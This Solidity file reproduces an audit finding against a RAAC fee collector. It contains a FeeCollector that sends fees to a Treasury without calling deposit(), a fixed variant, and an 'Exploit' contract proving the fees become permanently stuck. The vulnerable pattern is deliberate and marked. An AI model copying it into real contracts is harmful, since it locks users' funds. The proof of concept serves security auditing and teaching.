// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC FeeCollector — _processDistributions (CodeHawks 2025-02, finding 57207)
    Protocol fees are safeTransfer'd straight to the Treasury address.
    Treasury.withdraw only spends _balances, and _balances moves only in deposit().
    1000 RAAC lands on the Treasury and the accounted balance stays 0, so withdraw reverts.

    CREATE order inside Exploit:
      nonce 1 Token, 2 Treasury, 3 FeeCollector, 4 Payer
*/

contract Token {
    string public symbol = "RAAC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function safeTransfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function safeTransferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface ITreasury {
    function deposit(address token, uint256 amount) external;
    function getBalance(address token) external view returns (uint256);
}

contract Treasury {
    mapping(address => uint256) private _balances;
    uint256 private _totalValue;
    error InvalidAddress();
    error InvalidAmount();
    error InsufficientBalance();

    function getBalance(address token) external view returns (uint256) {
        return _balances[token];
    }

    function deposit(address token, uint256 amount) external {
        if (token == address(0)) revert InvalidAddress();
        if (amount == 0) revert InvalidAmount();
        Token(token).transferFrom(msg.sender, address(this), amount);
        _balances[token] += amount;
        _totalValue += amount;
    }

    function withdraw(address token, uint256 amount, address to) external {
        if (_balances[token] < amount) revert InsufficientBalance();
        _balances[token] -= amount;
        _totalValue -= amount;
        Token(token).transfer(to, amount);
    }
}

contract FeeCollector {
    Token public raacToken;
    address public treasury;
    address public admin;
    uint256 public collected;

    constructor(Token _token, address _treasury, address _admin) {
        raacToken = _token;
        treasury = _treasury;
        admin = _admin;
    }

    function collectFee(uint256 amount) external {
        raacToken.transferFrom(msg.sender, address(this), amount);
        collected += amount;
    }

    function distributeCollectedFees() external {
        require(msg.sender == admin, "admin");
        uint256 totalFees = raacToken.balanceOf(address(this));
        uint256[4] memory shares;
        shares[3] = totalFees;
        _processDistributions(totalFees, shares);
        collected = 0;
    }

    function _processDistributions(uint256 totalFees, uint256[4] memory shares) internal {
        if (shares[3] > 0 && totalFees > 0) {
            // @> VULN: safeTransfer into Treasury skips deposit(), so the accounted balance stays 0
            raacToken.safeTransfer(treasury, shares[3]);
        }
    }
}

contract FeeCollectorFixed {
    Token public raacToken;
    Treasury public treasury;
    address public admin;

    constructor(Token _token, Treasury _treasury, address _admin) {
        raacToken = _token;
        treasury = _treasury;
        admin = _admin;
    }

    function collectFee(uint256 amount) external {
        raacToken.transferFrom(msg.sender, address(this), amount);
    }

    function distributeCollectedFees() external {
        require(msg.sender == admin, "admin");
        uint256 totalFees = raacToken.balanceOf(address(this));
        raacToken.approve(address(treasury), totalFees);
        treasury.deposit(address(raacToken), totalFees);
    }
}

contract Payer {
    function pay(FeeCollector fc, Token token, uint256 amount) external {
        token.approve(address(fc), amount);
        fc.collectFee(amount);
    }

    function payFixed(FeeCollectorFixed fc, Token token, uint256 amount) external {
        token.approve(address(fc), amount);
        fc.collectFee(amount);
    }
}

contract Exploit {
    Token public token;
    Treasury public treasury;
    FeeCollector public collector;
    Payer public payer;
    uint256 public stuck;

    constructor() {
        token = new Token();
        treasury = new Treasury();
        collector = new FeeCollector(token, address(treasury), address(this));
        payer = new Payer();
        token.mint(address(payer), 1000 ether);
    }

    function run() external {
        payer.pay(collector, token, 1000 ether);
        uint256 held = token.balanceOf(address(collector));
        require(held == 1000 ether, "collected");
        collector.distributeCollectedFees();
        stuck = token.balanceOf(address(treasury));
        require(stuck == 1000 ether, "actual");
        require(treasury.getBalance(address(token)) == 0, "accounted");
        (bool ok,) = address(treasury).call(
            abi.encodeWithSelector(treasury.withdraw.selector, address(token), stuck, address(this))
        );
        require(!ok, "withdrew");
        require(token.balanceOf(address(treasury)) == 1000 ether, "still stuck");
    }
}
